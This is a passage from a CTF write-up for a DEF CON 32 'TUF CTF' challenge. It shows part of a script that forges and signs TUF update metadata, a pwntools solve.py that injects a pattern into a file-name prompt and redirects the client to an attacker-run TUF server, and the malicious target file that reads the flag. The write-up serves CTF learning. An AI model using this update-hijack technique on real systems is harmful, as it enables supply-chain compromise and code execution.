+</span></span><span style="display:flex;"><span>    target <span style="color:#f92672">=</span> Metadata(Targets(version<span style="color:#f92672">=</span><span style="color:#ae81ff">2</span>, spec_version<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;1.0&#34;</span>, expires<span style="color:#f92672">=</span>exp, targets<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#34;tcmupdate_v0.2.0.py&#34;</span>:TargetFile(length<span style="color:#f92672">=</span><span style="color:#ae81ff">79</span>, hashes<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#34;sha512&#34;</span>:<span style="color:#e6db74">&#34;870cba60f57b8cbee2647241760d9a89f3c91dba2664467694d7f7e4e6ffaca588f8453302f196228b426df44c01524d5c5adeb2f82c37f51bb8c38e9b0cc900&#34;</span>}, path<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;targets&#34;</span>)} ))
+</span></span><span style="display:flex;"><span>    target<span style="color:#f92672">.</span>sign(signer)
+</span></span><span style="display:flex;"><span>    target<span style="color:#f92672">.</span>to_file(tname)
+</span></span><span style="display:flex;"><span>    keyid_replace(tname)
+</span></span><span style="display:flex;"><span>    target_hash <span style="color:#f92672">=</span> hasher(tname)
+</span></span><span style="display:flex;"><span>    target_size <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>getsize(tname)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># build snapshot.json</span>
+</span></span><span style="display:flex;"><span>    sname <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;4.snapshot.json&#34;</span>
+</span></span><span style="display:flex;"><span>    snapshot <span style="color:#f92672">=</span> Metadata(Snapshot(version<span style="color:#f92672">=</span><span style="color:#ae81ff">4</span>, spec_version<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;1.0&#34;</span>, expires<span style="color:#f92672">=</span>exp, meta<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#34;targets.json&#34;</span>:MetaFile(version<span style="color:#f92672">=</span><span style="color:#ae81ff">2</span>, length<span style="color:#f92672">=</span>target_size, hashes<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#34;sha512&#34;</span>:target_hash})} ))
+</span></span><span style="display:flex;"><span>    signed_snapshot <span style="color:#f92672">=</span> Metadata<span style="color:#f92672">.</span>to_bytes(snapshot<span style="color:#f92672">.</span>signed)
+</span></span><span style="display:flex;"><span>    snapshot<span style="color:#f92672">.</span>sign(signer)
+</span></span><span style="display:flex;"><span>    snapshot<span style="color:#f92672">.</span>to_file(sname)
+</span></span><span style="display:flex;"><span>    keyid_replace(sname)
+</span></span><span style="display:flex;"><span>    snapshot_hash <span style="color:#f92672">=</span> hasher(sname)
+</span></span><span style="display:flex;"><span>    snapshot_size <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>getsize(sname)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># build timestamp.json</span>
+</span></span><span style="display:flex;"><span>    timestamp <span style="color:#f92672">=</span> Metadata(Timestamp(version<span style="color:#f92672">=</span><span style="color:#ae81ff">4</span>, spec_version<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;1.0&#34;</span>, expires<span style="color:#f92672">=</span>exp, snapshot_meta<span style="color:#f92672">=</span>MetaFile(version<span style="color:#f92672">=</span><span style="color:#ae81ff">4</span>, length<span style="color:#f92672">=</span>snapshot_size, hashes<span style="color:#f92672">=</span>{<span style="color:#e6db74">&#34;sha512&#34;</span>:snapshot_hash} )))
+</span></span><span style="display:flex;"><span>    timestamp<span style="color:#f92672">.</span>sign(signer)
+</span></span><span style="display:flex;"><span>    timestamp<span style="color:#f92672">.</span>to_file(<span style="color:#e6db74">&#34;timestamp.json&#34;</span>)
+</span></span><span style="display:flex;"><span>    keyid_replace(<span style="color:#e6db74">&#34;timestamp.json&#34;</span>)
+</span></span></code></pre></div><hr>
+<p><strong>solve.py</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python3" data-lang="python3"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> sign
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>conn <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;172.28.2.64&#39;</span>, <span style="color:#ae81ff">38002</span>)
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;critical&#34;</span>
+</span></span><span style="display:flex;"><span>payload1 <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;tcmupdate_v0[\D]3&#39;</span>
+</span></span><span style="display:flex;"><span>url <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;http://172.28.2.13:8003&#39;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(conn<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Enter type name:&#39;</span>)<span style="color:#f92672">.</span>decode())
+</span></span><span style="display:flex;"><span>print(payload1<span style="color:#f92672">.</span>decode())
+</span></span><span style="display:flex;"><span>conn<span style="color:#f92672">.</span>sendline(payload1)
+</span></span><span style="display:flex;"><span>conn<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Running tcmupdate_v0.3.0.py&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>sign<span style="color:#f92672">.</span>sign_all()
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(conn<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Enter a TUF server URL:&#39;</span>)<span style="color:#f92672">.</span>decode())
+</span></span><span style="display:flex;"><span>print(url<span style="color:#f92672">.</span>decode())
+</span></span><span style="display:flex;"><span>conn<span style="color:#f92672">.</span>sendline(url)
+</span></span><span style="display:flex;"><span>print(conn<span style="color:#f92672">.</span>recvline_regex(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;You entered: &#39;</span>)<span style="color:#f92672">.</span>decode())
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(conn<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;Enter a file path to download: &#39;</span>)<span style="color:#f92672">.</span>decode())
+</span></span><span style="display:flex;"><span>conn<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;tcmupdate_v0.2.0.py&#39;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>conn<span style="color:#f92672">.</span>interactive()
+</span></span><span style="display:flex;"><span>conn<span style="color:#f92672">.</span>close()
+</span></span></code></pre></div><hr>
+<p>We must setup a TUF server locally which hosts a metadata file and targets directory. Inside of /targets will be</p>
+<ul>
+<li>targets/870cba60f57b8cbee2647241760d9a89f3c91dba2664467694d7f7e4e6ffaca588f8453302f196228b426df44c01524d5c5adeb2f82c37f51bb8c38e9b0cc900.tcmupdate_v0.2.0.py</li>
+</ul>
+<p>containing:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python3" data-lang="python3"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;flag_2.txt&#34;</span>, <span style="color:#e6db74">&#34;r&#34;</span>) <span style="color:#66d9ef">as</span> f:
+</span></span><span style="display:flex;"><span>    print(f<span style="color:#f92672">.</span>read())
+</span></span></code></pre></div><p>Running solve.py remotely exploits the server and allows us to read the second and final flag!</p>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+
+<ul class="share-buttons">
+    <li>
+        <a target="_blank" rel="noopener noreferrer" aria-label="share TUF CTF on x"
+            href="https://x.com/intent/tweet/?text=TUF%20CTF&amp;url=https%3a%2f%2fyams.bot%2fwriteups%2fdefcon32%2ftufctf%2f&amp;hashtags=">
+            <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
+                <path
+                    d="M512 62.554 L 512 449.446 C 512 483.97 483.97 512 449.446 512 L 62.554 512 C 28.03 512 0 483.97 0 449.446 L 0 62.554 C 0 28.03 28.029 0 62.554 0 L 449.446 0 C 483.971 0 512 28.03 512 62.554 Z M 269.951 190.75 L 182.567 75.216 L 56 75.216 L 207.216 272.95 L 63.9 436.783 L 125.266 436.783 L 235.9 310.383 L 332.567 436.783 L 456 436.783 L 298.367 228.367 L 432.367 75.216 L 371.033 75.216 Z M 127.633 110 L 164.101 110 L 383.481 400.065 L 349.5 400.065 Z" />
+            </svg>
+        </a>
+    </li>
+    <li>
+        <a target="_blank" rel="noopener noreferrer" aria-label="share TUF CTF on linkedin"
+            href="https://www.linkedin.com/shareArticle?mini=true&amp;url=https%3a%2f%2fyams.bot%2fwriteups%2fdefcon32%2ftufctf%2f&amp;title=TUF%20CTF&amp;summary=TUF%20CTF&amp;source=https%3a%2f%2fyams.bot%2fwriteups%2fdefcon32%2ftufctf%2f">
+            <svg version="1.1" viewBox="0 0 512 512" xml:space="preserve" height="30px" width="30px" fill="currentColor">
+                <path
+                    d="M449.446,0c34.525,0 62.554,28.03 62.554,62.554l0,386.892c0,34.524 -28.03,62.554 -62.554,62.554l-386.892,0c-34.524,0 -62.554,-28.03 -62.554,-62.554l0,-386.892c0,-34.524 28.029,-62.554 62.554,-62.554l386.892,0Zm-288.985,423.278l0,-225.717l-75.04,0l0,225.717l75.04,0Zm270.539,0l0,-129.439c0,-69.333 -37.018,-101.586 -86.381,-101.586c-39.804,0 -57.634,21.891 -67.617,37.266l0,-31.958l-75.021,0c0.995,21.181 0,225.717 0,225.717l75.02,0l0,-126.056c0,-6.748 0.486,-13.492 2.474,-18.315c5.414,-13.475 17.767,-27.434 38.494,-27.434c27.135,0 38.007,20.707 38.007,51.037l0,120.768l75.024,0Zm-307.552,-334.556c-25.674,0 -42.448,16.879 -42.448,39.002c0,21.658 16.264,39.002 41.455,39.002l0.484,0c26.165,0 42.452,-17.344 42.452,-39.002c-0.485,-22.092 -16.241,-38.954 -41.943,-39.002Z" />
+            </svg>
+        </a>
+    </li>
+</ul>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+        <span>&copy; 2024 <a href="https://yams.bot/">🍠 yamsbot</a></span> · 
+
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://github.com/adityatelange/hugo-PaperMod/" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+<script>
+    document.getElementById("theme-toggle").addEventListener("click", () => {
+        if (document.body.className.includes("dark")) {
+            document.body.classList.remove('dark');
+            localStorage.setItem("pref-theme", 'light');
+        } else {
+            document.body.classList.add('dark');
+            localStorage.setItem("pref-theme", 'dark');
+        }
+    })
+
+</script>
+<script>
+    document.querySelectorAll('pre > code').forEach((codeblock) => {
+        const container = codeblock.parentNode.parentNode;
+
+        const copybutton = document.createElement('button');
+        copybutton.classList.add('copy-code');
+        copybutton.innerHTML = 'copy';
+
+        function copyingDone() {
+            copybutton.innerHTML = 'copied!';
+            setTimeout(() => {
+                copybutton.innerHTML = 'copy';
+            }, 2000);
+        }
+
+        copybutton.addEventListener('click', (cb) => {
+            if ('clipboard' in navigator) {
+                navigator.clipboard.writeText(codeblock.textContent);
+                copyingDone();
+                return;
+            }
+
+            const range = document.createRange();
+            range.selectNodeContents(codeblock);
+            const selection = window.getSelection();
+            selection.removeAllRanges();
+            selection.addRange(range);
+            try {
+                document.execCommand('copy');
+                copyingDone();
+            } catch (e) { };
+            selection.removeRange(range);
+        });
+
+        if (container.classList.contains("highlight")) {
+            container.appendChild(copybutton);
+        } else if (container.parentNode.firstChild == container) {
+            
+        } else if (codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName == "TABLE") {
+            
+            codeblock.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(copybutton);
+        } else {
+            
+            codeblock.parentNode.appendChild(copybutton);
+        }
+    });
+</script>
+</body>
+
+</html>
